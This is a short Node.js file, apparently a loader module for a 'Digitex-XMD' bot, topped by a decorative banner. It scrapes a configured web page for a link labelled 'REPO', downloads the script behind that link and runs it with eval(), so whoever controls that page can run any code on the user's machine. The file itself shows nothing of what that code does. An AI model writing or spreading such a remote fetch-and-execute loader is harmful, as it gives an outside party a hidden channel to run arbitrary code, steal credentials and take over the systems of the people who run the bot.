//  [DIGITEX-XMD EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted byJuma                                   
//  >> Version: 8.3.5-Digitex.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchREPOUrl() {
  try {
    const response = await axios.get(adams.DIGITEX_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("REPO")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('REPO not found 😭');
    }

    console.log('REPO loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchREPOUrl();
